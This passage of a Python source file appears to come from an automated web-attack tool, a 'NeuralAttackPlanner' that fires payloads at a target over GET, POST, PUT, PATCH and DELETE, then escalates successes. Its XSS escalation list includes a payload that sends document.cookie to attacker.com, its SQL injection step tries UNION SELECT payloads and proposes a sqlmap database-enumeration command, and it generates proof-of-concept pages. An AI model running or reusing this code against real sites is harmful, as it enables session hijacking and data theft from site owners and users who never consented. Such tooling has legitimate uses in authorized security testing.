                signals.append(Signal(type=SignalType.TECH_PYTHON, strength=0.8, source=fname))
            elif any(t in fname for t in ["ruby", "rails", "sinatra"]):
                signals.append(Signal(type=SignalType.TECH_RUBY, strength=0.8, source=fname))
            elif any(t in fname for t in ["java", "spring", "tomcat", "struts"]):
                signals.append(Signal(type=SignalType.TECH_JAVA, strength=0.8, source=fname))

        return signals
    
    def _get_best_vector(self) -> Optional[AttackVector]:
        """Get the best untried attack vector."""
        untried = [v for v in self.state.vectors if not v.attempted]
        
        if not untried:
            return None
        
        # Sort by expected value (prob * impact)
        untried.sort(
            key=lambda v: v.success_probability * v.impact_score,
            reverse=True,
        )
        
        return untried[0]
    
    async def _execute_vector(self, url: str, vector: AttackVector) -> Dict:
        """Execute an attack vector with support for multiple HTTP methods and body types."""
        vector.attempted = True
        result = {"success": False, "evidence": {}, "method": vector.method.value}

        if not self.http_client:
            return result

        try:
            if self.rate_limiter:
                await self.rate_limiter.acquire()

            start = datetime.now()
            response = None

            # =================================================================
            # GET request
            # =================================================================
            if vector.method == HttpMethod.GET:
                # Build test URL with payload in query string
                if "?" in url:
                    test_url = f"{url}&{vector.param_name}={quote(vector.payload)}"
                else:
                    test_url = f"{url}?{vector.param_name}={quote(vector.payload)}"

                response = await self.http_client.get(test_url, headers=vector.headers or {})

            # =================================================================
            # POST request with form data
            # =================================================================
            elif vector.method == HttpMethod.POST and vector.body_type == BodyType.FORM:
                form_data = {vector.param_name: vector.payload}
                headers = {**vector.headers, "Content-Type": "application/x-www-form-urlencoded"}
                response = await self.http_client.post(url, data=form_data, headers=headers)

            # =================================================================
            # POST request with JSON body
            # =================================================================
            elif vector.method == HttpMethod.POST and vector.body_type == BodyType.JSON:
                json_data = {vector.param_name: vector.payload}
                headers = {**vector.headers, "Content-Type": "application/json"}
                response = await self.http_client.post(url, json=json_data, headers=headers)

            # =================================================================
            # POST request with XML body
            # =================================================================
            elif vector.method == HttpMethod.POST and vector.body_type == BodyType.XML:
                xml_payload = f'<?xml version="1.0"?><root><{vector.param_name}>{vector.payload}</{vector.param_name}></root>'
                headers = {**vector.headers, "Content-Type": "application/xml"}
                response = await self.http_client.post(url, content=xml_payload, headers=headers)

            # =================================================================
            # PUT request
            # =================================================================
            elif vector.method == HttpMethod.PUT:
                if vector.body_type == BodyType.JSON:
                    json_data = {vector.param_name: vector.payload}
                    headers = {**vector.headers, "Content-Type": "application/json"}
                    response = await self.http_client.put(url, json=json_data, headers=headers)
                else:
                    form_data = {vector.param_name: vector.payload}
                    headers = {**vector.headers, "Content-Type": "application/x-www-form-urlencoded"}
                    response = await self.http_client.put(url, data=form_data, headers=headers)

            # =================================================================
            # PATCH request
            # =================================================================
            elif vector.method == HttpMethod.PATCH:
                if vector.body_type == BodyType.JSON:
                    json_data = {vector.param_name: vector.payload}
                    headers = {**vector.headers, "Content-Type": "application/json"}
                    response = await self.http_client.patch(url, json=json_data, headers=headers)
                else:
                    form_data = {vector.param_name: vector.payload}
                    headers = {**vector.headers, "Content-Type": "application/x-www-form-urlencoded"}
                    response = await self.http_client.patch(url, data=form_data, headers=headers)

            # =================================================================
            # DELETE request (payload in query string)
            # =================================================================
            elif vector.method == HttpMethod.DELETE:
                if "?" in url:
                    test_url = f"{url}&{vector.param_name}={quote(vector.payload)}"
                else:
                    test_url = f"{url}?{vector.param_name}={quote(vector.payload)}"
                response = await self.http_client.delete(test_url, headers=vector.headers or {})

            # =================================================================
            # Fallback: GET
            # =================================================================
            else:
                if "?" in url:
                    test_url = f"{url}&{vector.param_name}={quote(vector.payload)}"
                else:
                    test_url = f"{url}?{vector.param_name}={quote(vector.payload)}"
                response = await self.http_client.get(test_url)

            elapsed = (datetime.now() - start).total_seconds()

            # Check for success indicators
            if response and vector.payload in response.text:
                result["success"] = True
                result["evidence"]["reflected"] = True
                result["evidence"]["context"] = self._get_context(response.text, vector.payload)

            # Detect new signals
            if response:
                new_signals = self.signal_detector.detect_signals(
                    response.text,
                    dict(response.headers),
                    response.status_code,
                    elapsed,
                    canary=vector.payload,
                    baseline=self.state,
                )

                self.state.signals.extend(new_signals)
                result["signals"] = new_signals
                result["status_code"] = response.status_code

            vector.result = result

        except Exception as e:
            result["error"] = str(e)
            logger.debug(f"[Neural] Vector execution error ({vector.method.value}): {e}")

        return result
    
    def _learn_from_result(self, vector: AttackVector, result: Dict):
        """Learn from attack result and update metrics."""
        self.state.requests_made += 1
        self._metrics["vectors_executed"] += 1
        self._metrics["by_attack_type"][vector.type] += 1

        if result.get("success"):
            self.state.successful_attacks += 1
            self.state.working_patterns.add(vector.payload)
            vector.successful = True
            self._metrics["successful_attacks"] += 1

            # Record exploit
            self.exploits.append({
                "type": vector.type,
                "payload": vector.payload,
                "evidence": result.get("evidence", {}),
            })

            logger.info(f"[Neural] SUCCESS: {vector.name}")

        else:
            # Check if blocked
            signals = result.get("signals", [])
            if any(s.type == SignalType.WAF_BLOCK for s in signals):
                self.state.blocked_patterns.add(vector.payload)
                logger.info(f"[Neural] Blocked: {vector.payload[:30]}...")

        # Track new signals detected during execution
        new_signals = result.get("signals", [])
        for sig in new_signals:
            self._metrics["signals_detected"] += 1
            self._metrics["by_signal_type"][sig.type.name] += 1
    
    async def _try_escalation(self, url: str, vector: AttackVector) -> Optional[Dict]:
        """Try to escalate a successful attack."""
        escalation = None
        
        # XSS escalation
        if "xss" in vector.type:
            escalation = await self._escalate_xss(url, vector)
        
        # SQLi escalation
        elif "sqli" in vector.type:
            escalation = await self._escalate_sqli(url, vector)
        
        return escalation
    
    async def _escalate_xss(self, url: str, vector: AttackVector) -> Optional[Dict]:
        """Escalate XSS to higher impact."""
        escalation_payloads = [
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>",
        ]
        
        for payload in escalation_payloads:
            if payload in self.state.blocked_patterns:
                continue
            
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                test_url = f"{url}?test={quote(payload)}"
                response = await self.http_client.get(test_url)
                
                if payload in response.text:
                    return {
                        "type": "xss_escalated",
                        "original_payload": vector.payload,
                        "escalated_payload": payload,
                        "impact": "Session hijacking possible",
                        "poc": self._generate_xss_poc(url, payload),
                    }
            except Exception as e:
                logger.debug(f"[Neural] XSS escalation probe failed for {payload[:30]}: {e}")

        return None

    async def _escalate_sqli(self, url: str, vector: AttackVector) -> Optional[Dict]:
        """Escalate SQLi to data extraction."""
        # Try UNION-based extraction
        union_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ]
        
        for payload in union_payloads:
            if payload in self.state.blocked_patterns:
                continue
            
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                
                test_url = f"{url}?test={quote(payload)}"
                response = await self.http_client.get(test_url)
                
                # Check for successful UNION
                if response.status_code == 200 and "NULL" in response.text:
                    return {
                        "type": "sqli_escalated",
                        "original_payload": vector.payload,
                        "escalated_payload": payload,
                        "impact": "Data extraction possible",
                        "poc": f"sqlmap -u '{url}?test=1' --dbs",
                    }
            except Exception as e:
                logger.debug(f"[Neural] SQLi escalation probe failed for {payload[:30]}: {e}")

        return None

    def _get_context(self, html: str, payload: str, size: int = 100) -> str:
        """Get context around payload in HTML."""
        pos = html.find(payload)
        if pos == -1:
            return ""
        start = max(0, pos - size)
        end = min(len(html), pos + len(payload) + size)
        return html[start:end]
    
    def _generate_xss_poc(self, url: str, payload: str) -> str:
        """Generate XSS PoC."""
        return f"""<!DOCTYPE html>
<html>
<head><title>XSS PoC</title></head>
<body>
<h1>XSS Vulnerability Proof of Concept</h1>
<p><strong>URL:</strong> {url}?test={quote(payload)}</p>
<p><strong>Payload:</strong> <code>{payload}</code></p>
<h2>Impact</h2>
<ul>
<li>Session hijacking via cookie theft</li>
<li>Keylogging user input</li>
<li>Phishing via content injection</li>
<li>CSRF via script execution</li>
</ul>
<a href="{url}?test={quote(payload)}" target="_blank">Test Link</a>
</body>
</html>"""
    
    # =========================================================================
    # REPORT GENERATION
    # =========================================================================
    
    def _generate_report(self, url: str, chains: List[ExploitChain]) -> str:
        """Generate comprehensive neural attack report."""
        # Count signals by type
        signal_counts = {}
        for signal in self.state.signals:
            stype = signal.type.name
            signal_counts[stype] = signal_counts.get(stype, 0) + 1
        
        report = f"""# 🧠 Neural Attack Planner Report

## Target Analysis

**URL:** {url}
**Baseline Response:** {self.state.baseline_length} bytes, {self.state.baseline_time:.2f}s
**Requests Made:** {self.state.requests_made}
**Successful Attacks:** {self.state.successful_attacks}

## Signal Detection

| Signal Type | Count |
|-------------|-------|
"""
        for stype, count in sorted(signal_counts.items(), key=lambda x: x[1], reverse=True):
            report += f"| {stype} | {count} |\n"
        
        report += f"""
## Technologies Detected

"""
        for tech in self.state.target_tech:
            report += f"- {tech}\n"
        
        if not self.state.target_tech:
            tech_signals = [s for s in self.state.signals if s.type.name.startswith("TECH_")]
            for s in tech_signals:
                report += f"- {s.type.name.replace('TECH_', '')} (confidence: {s.strength:.0%})\n"
        
        report += f"""
## Attack Vectors Generated

Total: {len(self.state.vectors)}

| Vector | Type | Probability | Impact |
|--------|------|-------------|--------|
"""
        for v in sorted(self.state.vectors, key=lambda x: x.success_probability, reverse=True)[:10]:
            status = "✅" if v.successful else "❌" if v.attempted else "⏳"
            report += f"| {status} {v.name[:30]} | {v.type} | {v.success_probability:.0%} | {v.impact_score:.0%} |\n"
        
        report += f"""
## Compound Attack Chains

"""
        if chains:
            for i, chain in enumerate(chains, 1):
                report += f"""### {i}. {chain.name}

**Probability:** {chain.combined_probability:.0%}
**Impact:** {chain.combined_impact:.0%}

Steps:
"""
                for j, step in enumerate(chain.steps, 1):
                    report += f"{j}. {step.name} ({step.type})\n"
                report += "\n"
        else:
            report += "_No compound chains identified_\n"
        
        report += f"""
## Successful Exploits

"""
        if self.exploits:
            for i, exploit in enumerate(self.exploits, 1):
                report += f"""### {i}. {exploit['type']}

**Payload:** `{exploit.get('payload', 'N/A')[:100]}`
**Evidence:** {json.dumps(exploit.get('evidence', {}), indent=2)[:500]}

"""
                if exploit.get("poc"):
                    report += f"""**PoC:**
```html
{exploit['poc'][:1500]}
```

"""
        else:
            report += "_No successful exploits_\n"
        
        report += f"""
## Learning Summary

**Blocked Patterns:** {len(self.state.blocked_patterns)}
**Working Patterns:** {len(self.state.working_patterns)}

### Working Payloads
"""
        for p in list(self.state.working_patterns)[:5]:
            report += f"- `{p[:80]}`\n"
        
        report += """
### Blocked Payloads
"""
        for p in list(self.state.blocked_patterns)[:5]:
            report += f"- `{p[:80]}`\n"
        
        return report


# =============================================================================
# MAIN ENTRY POINT
# =============================================================================

async def neural_attack_plan(
    target_url: str,
    initial_findings: List[dict] = None,
    http_client=None,
    rate_limiter=None,
    max_iterations: int = 20,
) -> Tuple[List[Dict], List[ExploitChain], str]:
    """
    Execute neural attack planning.

    Returns:
        Tuple of (exploits, chains, report)
    """
    planner = NeuralAttackPlanner(http_client, rate_limiter)
    return await planner.plan_and_execute(
        target_url,
        initial_findings or [],
        max_iterations,
    )


# =============================================================================
# H1 FIX 2026-02-13: PUBLIC API EXPORTS
# =============================================================================

__all__ = [
    # Enums
    "SignalType",
    "PlannerPhase",
    "HttpMethod",      # FIX 2026-02-19
    "BodyType",        # FIX 2026-02-19
    # Dataclasses
    "Signal",
    "AttackVector",
    "NeuralState",
    "ExploitChain",
    # Classes
    "SignalDetector",
    "NeuralDecisionEngine",
    "CompoundAttackSynthesizer",
    "NeuralAttackPlanner",
    # Convenience function
    "neural_attack_plan",
    # Utility classes
    "BoundedList",
    # Constants
    "MAX_SIGNALS",
    "MAX_VECTORS",
    "MAX_EXPLOITS",
]
